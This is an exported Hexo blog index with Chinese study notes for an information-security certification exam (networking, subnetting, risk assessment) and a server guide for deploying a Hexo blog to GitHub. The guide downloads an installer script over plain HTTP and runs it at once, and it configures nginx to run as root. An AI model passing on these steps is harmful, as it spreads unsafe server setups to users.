国家信息安全等级保护三级的要求。</li><li>机密级：包含有最高为机密级的国家密码，其防护水平不低于国家安全等级保护四级的要求<ul><li>绝密级：包含有最高为绝密级的国家密码，其防护水平不低于国家信息安全等级保护五级的要求</li></ul></li></ul></li></ul></li></ol></li><li><p>网络隔离</p><ul><li>网络隔离是一项网络安全技术，目标是确保有害的攻击隔离，在可信网络之外保证可信网络内部信息不外泄的前提下，完成网络数据的安全交换。</li><li>网络隔离<ul><li>第一代-完全隔离：完全的物理隔离</li><li>第二代-硬件卡隔离：增加硬件卡隔离</li><li>第三代-数据传播隔离：利用传播系统分时复制文件的途径来实现隔离</li><li>第四代-空气开关隔离：使用单刀双掷开关</li><li>第五代-安全通道隔离：通过专用通信硬件和专有安全协议等安全机制来实现内外网络的隔离和数据交换</li></ul></li><li>网络隔离安全要点：<ul><li>要具有高度的自身安全性</li><li>要确保网络之间是隔离的</li><li>要保证网间交换的只是应用数据</li><li>要对内网的访问进行严格的控制和检查</li><li>要在坚持隔离的前提下保证网络畅通和应用畅通</li></ul></li><li>网络隔离的关键是在对于通信数据的控制，即通过不可路由协议来完成内网数据交换</li></ul></li><li><p>安全监控</p><ul><li>系统安全监控，是指对系统的运行状况和系统中的用户的行为进行监视，控制和记录。安全监控的内容包括主机系统监视，网络状态监视，用户操作监视，主机应用监视，主机外设监视，网络连接监视等。</li><li>安全监控的分类<ul><li>网络安全监控：全面的网络安全控制，细粒度的控制，网络审计和其他包括日志，报警和拦截等功能。</li><li>主机安全监控功能：访问控制，系统监控，系统审计，系统漏洞检查</li></ul></li></ul></li><li><p>信息安全风险评估管理</p><ul><li><p>信息安全风险评估：是依据有关信息安全技术标准，对信息系统及尤其处理，传输和存储的信息的保密性，完整性，可用性等安全属性进行科学评价的过程</p></li><li><p>风险评估方法分为三类：定量评估方法，定性评估方法，定性和定量结合的综合评估方法。</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716104824.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>风险评估方法</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716105127.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>降低风险的途径</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716105407.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul></li><li><p>信息安全法律法规</p><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716110548.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>知识产权保护期限</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716144629.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>产权人确定</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716144757.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>侵权判断</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716144921.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul></li><li><p>标准的分类</p><ul><li><p>标准的分类</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716145356.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>标准代号的识别</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716145854.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>信工考证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信工考证</title>
    <link href="/2020/07/15/%E4%BF%A1%E5%B7%A5%E8%80%83%E8%AF%81/"/>
    <url>/2020/07/15/%E4%BF%A1%E5%B7%A5%E8%80%83%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="考证大纲"><a href="#考证大纲" class="headerlink" title="考证大纲"></a>考证大纲</h1><h2 id="上午：信息安全基础知识"><a href="#上午：信息安全基础知识" class="headerlink" title="上午：信息安全基础知识"></a>上午：信息安全基础知识</h2><h4 id="上午主要有六个考点"><a href="#上午主要有六个考点" class="headerlink" title="上午主要有六个考点"></a>上午主要有六个考点</h4><ol><li>信息安全基础知识<ul><li>信息安全概念，信息安全法律法规，信息安全管理基础，信息安全标准化知识，信息安全专业英语</li></ul></li><li>计算机网络基础知识<ul><li>计算机网络的体系结构</li><li>interner协议（IP,ICMP,OSRF,RIP,ARP,IGMP,BGP,TCP,UDP,DNS,SMTP ,POP3,PGP,FTP,HTTP,DHCP）</li></ul></li><li>密码学<ul><li>密码学的基本概念，分组密码，序列密码，Hash函数，公钥密码体制，数字签名，认证，密钥管理</li></ul></li><li>网络安全<ul><li>网络安全的基本概念，网络安全威胁，网络安全防御，无线网络安全。</li></ul></li><li>计算机安全<ul><li>计算机设备安全，操作系统安全，数据库系统安全，恶意代码，计算机取证，嵌入式系统安全，云计算安全</li></ul></li><li>应用系统安全<ul><li>web安全，电子商务安全，信息隐藏，网络舆情，隐私保护</li></ul></li></ol><h2 id="下午：信息安全应用技术"><a href="#下午：信息安全应用技术" class="headerlink" title="下午：信息安全应用技术"></a>下午：信息安全应用技术</h2><ol><li>密码学应用<ul><li>密码算法的实现,密码算法的应用,<strong>认证协议的应用,密钥管理技术</strong></li></ul></li><li><strong>网络安全工程</strong><ul><li>网络安全需求分析和基本设计,<strong>网络安全产品的配置和使用</strong>,网络安全风险评估实施,<strong>网络安全技术应用</strong></li></ul></li><li>系统安全工程<ul><li><strong>访问控制,信息系统安全的需求与分析</strong>,信息安全产品的配置与使用,信息系统安全评估</li></ul></li><li>应用安全工程<ul><li><strong>web安全的需求分析和基本设计,电子商务安全的需求分析和基本设计,嵌入式系统的安全应用,数字水印在版权中的应用,位置隐私技术的应用</strong></li></ul></li></ol><h1 id="计算机硬件基础"><a href="#计算机硬件基础" class="headerlink" title="计算机硬件基础"></a>计算机硬件基础</h1><ol><li><p>中央处理器</p><ul><li>四个功能<ul><li>cpu的基础功能：指令控制，操作控制，时间控制，数据加工</li><li>cpu的组成：运算器，控制器，cache</li><li>控制器：<ul><li>功能：指挥计算机各个部件协调一致的自动运行</li><li>组成：程序计数器(PC)，指令寄存器(IR)，指令译码器，时序产生器，操作控制器</li></ul></li><li>运算器 (ALU)：<ul><li>功能：在控制器的指挥下，进行算术运算和逻辑运算</li><li>组成：算数逻辑单元（ALU），通用寄存器，数据缓冲寄存（DR）状态条件寄存器（PSW）</li></ul></li></ul></li><li>cpu中的主要寄存器：<ul><li>cpu缓冲寄存器（DR）：暂时存放（ALU）的运算结果，或有数据存储器读出的一个数据字，或来自外部接口的一个数据字</li><li>指令寄存器（IR）：保存当前正在执行的一条指令</li><li>程序计数器（PC）：确定下一条指令</li><li>数据地址寄存器（AR）：保存当前cpu所访问的数据cache存储器中的地址</li><li>通用寄存器（R0~R3）：当ALU执行算术或逻辑运算时，为ALU提供一个工作区</li><li>状态寄存器（PSW）：保存由算术指和逻辑质量你个运算或测试结果建立的各种条件代码</li></ul></li></ul></li><li><p>指令的寻址方式</p><ul><li><p>指令格式：操作数/地址码</p></li><li><p>寻址方式：太多了，记不过来。需要的时候再去百度把</p></li></ul></li></ol><ol start="3"><li><p>存储器</p><ul><li><p>存储器又称为内存，主要用来存放计算机在运行期间正在执行的程序和数据，<strong>cpu可以直接访问内存</strong></p></li><li><p>存储单位，存储元，位（bit） ，字节（B）</p><table><thead><tr><th>换算前</th><th></th></tr></thead><tbody><tr><td>8bit</td><td>1B</td></tr><tr><td>2<sup>10</sup>B</td><td>1kb</td></tr><tr><td>2<sup>10</sup>KB</td><td>1MB</td></tr><tr><td>2<sup>10</sup>MB</td><td>1GB</td></tr><tr><td>2<sup>10</sup>GB</td><td>!TB</td></tr></tbody></table></li></ul></li></ol><ol start="4"><li><p>总线和接口</p><ul><li>按照传送信息来分类</li></ul><ol><li>数据总线<ul><li>用于传送数据信息</li><li>数据信息在数据总线上双向传送</li><li>数据总线的根数决定了通过该总线一次可以传送的信息量</li></ul></li><li>地址总线<ul><li>用来传送地址信息，地址信息在地址总线上单向传输</li><li>地址总线的根数决定了总线可以直接寻址的内存地址空间大小</li><li>n根地址总线可以寻址的地址空间是2<sup>n</sup></li></ul></li><li>控制总线<ul><li>用于在主控设备和被控设备之间传达控制信号</li></ul></li></ol><ul><li>按照所处位置分类</li></ul><ol><li>片内总线<ul><li>cpu内部多个功能部件相连的数据传输通路</li><li>cpu内部运算器，控制器以及寄存器之间通过片内总线串数的数据</li></ul></li><li>系统总线<ul><li>又称内总线，是cpu内存和各种接口电路之间的信息通路</li></ul></li><li>通信总线<ul><li>又称外总线，是计算机与计算机之前或计算机通信设备之间的信息传输通路</li></ul></li></ol></li><li><p>外部设备</p><ol><li>输入设备<ul><li>键盘，鼠标</li></ul></li><li>输出设备<ul><li>显示器，打印机，绘图仪</li></ul></li><li>外部存储器<ul><li>磁带，软盘，硬盘，光盘</li></ul></li></ol></li><li><p>冯诺依曼体系</p><ul><li>太多了，略过</li></ul></li><li><p>计算机常用的性能指标</p><ul><li>主频</li><li>字长</li><li>运算速度</li><li>存储容量</li><li>内存寻址空间</li><li>存储周期</li><li>总线的带宽</li></ul></li></ol><h1 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h1><ol><li><p>计算机网络的类别</p><ul><li>按不同的范围分<ul><li>广域网WAN</li><li>城域网MAN</li><li>局域网LAN</li><li>个人区域网PAN</li></ul></li><li>按不同使用者划分<ul><li>公用网</li><li>专用网</li></ul></li><li>用来把用户接入因特网的网络(ISP居民接入网)</li></ul></li><li><p>计算机网络的拓扑结构</p></li></ol><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164215.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164246.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ol start="3"><li><p>计算机网络体系结构</p><ol><li><p>osi七层模型体系</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164314.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>tcp/ip体系结构</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164347.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol></li></ol><ol start="4"><li><p>ipv4</p><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164411.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul></li></ol><ul><li><p>A类地址只有126的范围是因为</p><ul><li>全零表示本网络上的所有主机</li><li>127段用于环回地址</li></ul></li><li><p>侧重点：</p><ul><li>根据ip地址判断是哪一类的范围</li><li>知道网络号去求主机数怎么求</li></ul></li><li><p>所预留的特殊ip地址(也就是不在互联网上路由)</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164434.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><ol start="5"><li><p>子网划分</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164502.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol><ul><li><p>案例解析1</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164523.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><pre><code>+ B类地址主机号和网络号分别为16/16，二进制中网络号用全1来表示，主机号用全0表示，这里主机号为16个1，网络号为16个0+ 将27个地址划分为子网，也就是2&lt;sup&gt;n&lt;/sup&gt;&gt;=  27。 2的四次方为16，5次方为32。所以这里的n为5，需要从主机位中取5位出来，网络号为16+5=21位。+ 在未划分前用二进制来表达，有16个1是网络号，16个1是主机号。在从主机号中取了5位出来划分子网，网络号位为21个1。剩余的主机号位32-21=11个0+ 换成十进制后还是分成4段，每八位一段。八个1转成十进制为255这里不需要算，记一下就行了，需要算的是从主机号取出五个用来划分子网的网络号，也就是5个1转成十进制为多少</code></pre><ul><li><p>案例解析2</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164612.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><pre><code>+ 这里不知道划分了多少个子网，但是算一下就可以求出了。2&lt;sup&gt;n&lt;/sup&gt; &gt;= 700 n ==&gt; 10。2的九次方为512，十次方为1024。所以这里n取10。+ 32-10=22，总共有22个1，这里需要计算的是第三段6个1转成十进制为多少</code></pre><ul><li>案例解析3</li></ul><pre><code>| ![](https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164810.png) || ------------------------------------------------------------ ||                                                              |+ 每个子网最少50个主机位，2&lt;sup&gt;n&lt;/sup&gt;&gt;= 50 。2的五次方32，六次方64，n取6。c类地址网络位为8，该c类的网络位至少要保留6为的网络为，只能拿出8-6=2位网络号用于子网划分，也就是2&lt;sup&gt;2&lt;/sup&gt;为4。故结果为C</code></pre><ol start="6"><li><p>ipv6</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164855.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol><ol start="7"><li><p>dns</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164920.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table><ul><li>DNS主要作用为将域名解析为IP地址</li><li>域名又分为不同的级别</li></ul><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715164947.png" srcset="/img/loading.gif" alt="img"></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol><ul><li><p>dns要进行ip地址解析有哪些方法？</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715165013.png" srcset="/img/loading.gif" alt="img"></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><ol start="8"><li><p>internet服务</p><ul><li>常见的interner服务</li></ul><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715165032.png" srcset="/img/loading.gif" alt="img"></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ol><ol start="9"><li><p>校验码</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715165056.png" srcset="/img/loading.gif" alt="img"></th></tr></thead><tbody><tr><td></td></tr></tbody></table><ul><li>校验码这块的知识点比较多，就不记了。用的时候再百度把</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>信工考证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>github+hexo部署个人博客踩坑记</title>
    <link href="/2020/07/15/github+hexo%E9%83%A8%E7%BD%B2%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91%E8%AE%B0/"/>
    <url>/2020/07/15/github+hexo%E9%83%A8%E7%BD%B2%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-git"><a href="#1-git" class="headerlink" title="1.  git"></a>1.  git</h2><ol><li><p>安装</p><ul><li><p><code>yum update &amp;&amp; yum install git -y</code></p></li><li><p>安装完成后进行验证</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200714154845.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>如果这里使用的是阿里云的服务器的话是自带有git的，完全不用安装。</p></li></ul></li><li><p>配置</p><pre><code class="hljs shell">git config --global user.name "name"# 这里的name填的是githhub的用户名git config --global user.email "emali" # emalie则是github的邮件git config user.name# 输出绑定的用户git config user.email# 输出绑定的邮箱<span class="hljs-meta">#</span><span class="bash"> 生成免密key</span>ssh-keygen -t rsa -C "emali"<span class="hljs-meta">#</span><span class="bash"> emali 指的是上面的github邮件，这一步主要是生成ssh密钥，后续将博客同步到github时用的</span></code></pre><ul><li><p>验证</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200714195255.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>最后面的生成ssh密钥已经生成过了，就不再次生成了。</p></li></ul></li></ol><h2 id="2-安装node-js"><a href="#2-安装node-js" class="headerlink" title="2. 安装node.js"></a>2. 安装node.js</h2><pre><code class="hljs shell">yum update gcc -y# 安装gcc后续用来编译安装node.jsyum install gcc+ gcc-c++ -ywget https://npm.taobao.org/mirrors/node/v10.13.0/node-v10.13.0.tar.gz# 下载node.js的安装文件tar xvf node-v10.13.0.tar.gzcd node-v10.13.0/./configure# 生成文件make# 编译这一步超级久，看服务器配置吧，反正我编译了一个钟make install# 安装</code></pre><ul><li>上面的操作都已经装过了,且不方便再重复一次,这里不贴图了。</li></ul><h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3. 安装hexo"></a>3. 安装hexo</h2><pre><code class="hljs shell">cd /root &amp;&amp; mkdir hexo# 切换到root目录下生成hexo文件npm config set registry https://registry.npm.taobao.org# 将npm源更换为淘宝的,如果不更换,默认源下载慢到怀疑人生.cd hexonpm install -g hexo-cli #安装hexohexo init myblog # hexo 生成myblog文件夹在其中进行初始化npm installhexo g# 生成静态文件</code></pre><ul><li>访问<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 就可以看到生成的博客了。</li><li>设置主题</li><li>hexo 官网上提供了三百多款主题，想要哪个可以自己选择：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a> (没有科学上网的话访问较慢)</li></ul><pre><code class="hljs shell">git clone 主题链接tar -xvf 主题压缩包<span class="hljs-meta">#</span><span class="bash"> 解压之后会有一个主题名</span>vim /root/hexo/myblog/_config.yml在theme：后换上解压出来的主题名就算是应用主题了。hexo clean# 清除静态文件hexo g# 生成新主题的静态文件</code></pre><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200714201954.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><h2 id="4-安装宝塔-Nginx"><a href="#4-安装宝塔-Nginx" class="headerlink" title="4. 安装宝塔+Nginx"></a>4. 安装宝塔+Nginx</h2><ul><li>安装宝塔</li></ul><pre><code class="hljs bash">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</code></pre><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715093804.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>安装配置Nginx</p></li><li><p>在软件商店搜索nginx，那个免费的就是了。因为安装过了，显示的是卸载。</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200714205444.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>下载之后点击右侧的设置，修改配置。</p></li><li><p>第一行改成 <code>user root www</code> 这里的用户不是root的话可能没有权限</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715082056.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>第六十五行改成也就是nginx网站根目录<code>root  /root/hexo/myblog/public;</code></p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715113613.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>再返回nginx管理，将nginx进行重启。</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715082627.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>到这一步就已经配置好网站了，可以使用ip或域名的形式访问前面部署好的hexo了。</p></li></ul><h2 id="5-部署到github"><a href="#5-部署到github" class="headerlink" title="5. 部署到github"></a>5. 部署到github</h2><ul><li><p>新建仓库，访问github.com 在首页点击创建仓库。<strong>（！！！仓库名前缀一定要和用户名一致，不然会连接不上）</strong></p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715083252.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>接下来就是修改hexo的配置文件，配置好github链接</p></li><li><p><code>vim /root/hexo/myblog/_config.yml</code></p></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># 将光标下滑至文件的末尾</span>deploy:  <span class="hljs-built_in">type</span>: git  repository:    github: git@github.com:xiaoming/xiaoming.github.io.git<span class="hljs-comment"># 这里的xiaoming改成自己的仓库名</span>  branch: master</code></pre><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715084018.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>安装同步到github的插件<code>npm install hexo-deployer-git --save</code></p></li><li><p>查看前面生成的ssh密钥<code>cat /root/.ssh/id_rsa.pub</code>将其复制</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715084946.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>返回github点击右上角的头像，然后settting，再ssh key and gpg keys 添加新的ssh密钥</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715085421.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>返回服务器，在终端输入 <code>ssh -T git@github.com</code> 验证连接。提示这个显示连接成功。</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200715114702.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul><h2 id="6-发布文章"><a href="#6-发布文章" class="headerlink" title="6. 发布文章"></a>6. 发布文章</h2><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/hexo/myblog<span class="hljs-comment"># 切换到hexo环境下</span>hexo new hello-world<span class="hljs-comment"># 生成名为hello-world的文章</span>hexo clean<span class="hljs-comment"># 清除静态文件</span>hexo g<span class="hljs-comment"># 生成静态文件</span>hexo d<span class="hljs-comment"># 同步到github</span></code></pre><ul><li>几分钟后访问xiaoming.github.io就可以看到自己的发布的文章了。(这里的xiaoming为自己的用户名)</li></ul><h2 id="7-踩坑总结"><a href="#7-踩坑总结" class="headerlink" title="7. 踩坑总结"></a>7. 踩坑总结</h2><ul><li>默认的是next的主题，很简洁，如果要个性化的话，可以去hexo访问的主题商店，很多主题都会有文档的，有的写的很详细，有的一笔带过。这里不推荐第一次接触就去弄那种很复杂的主题，因为会怀疑人生了。(我就是折腾了大几天，自闭了都)</li><li>还有发布文章要内嵌图片的话，需要用markdown格式的链接。有个大坑需要注意，白嫖gitee的仓库做图床的话，访问着没有登录gitee账号是无法加载图片的。本博客用的是阿里云oss+picgo做的图床。(阿里云oss如何部署图床自行百度，这里不写出来了。)</li><li>hexo常用命令缩写</li></ul><pre><code class="hljs bash">hexo g <span class="hljs-comment"># 完整命令为hexo generate,用于生成静态文件</span>hexo s <span class="hljs-comment"># 完整命令为hexo server,用于启动服务器，主要用来本地预览</span>hexo d <span class="hljs-comment"># 完整命令为hexo deploy,用于将本地文件发布到github上</span>hexo n <span class="hljs-comment"># 完整命令为hexo new,用于新建一篇文章</span>------ 分割线 -------hexo new “postName” <span class="hljs-comment"># 新建文章</span>hexo new page “pageName” <span class="hljs-comment"># 新建页面</span>hexo generate <span class="hljs-comment"># 生成静态页面至public目录</span>hexo server <span class="hljs-comment"># 开启预览访问端口（默认端口4000，“ctrl + c”关闭server）</span>hexo deploy <span class="hljs-comment"># 部署到GitHub</span>hexo <span class="hljs-built_in">help</span> <span class="hljs-comment"># 查看帮助</span>hexo version <span class="hljs-comment"># 查看Hexo的版本</span>hexo s -g <span class="hljs-comment"># 生成并本地预览</span>hexo d -g <span class="hljs-comment"># 生成并上传</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello-world</title>
    <link href="/2020/07/14/hello-world/"/>
    <url>/2020/07/14/hello-world/</url>
    
    <content type="html"><![CDATA[<p>hello world<br>hello world<br>hello world</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
